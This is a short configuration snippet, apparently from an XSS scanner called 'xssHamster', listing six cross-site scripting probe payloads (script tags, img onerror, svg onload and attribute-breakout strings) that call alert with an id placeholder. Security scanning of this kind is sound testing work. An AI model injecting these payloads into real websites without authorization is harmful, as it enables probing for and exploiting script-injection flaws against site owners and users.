xssHamster.scanner.payloads.general = [
'<img src=x onerror=alert({id})>',
'<script>alert({id})</script>',
'"><img src=x onerror=alert({id})>',
'" onload=alert({id})',
"\"><img src=x onerror=alert({id})>",
"</script><svg/onload=alert({id})>"
]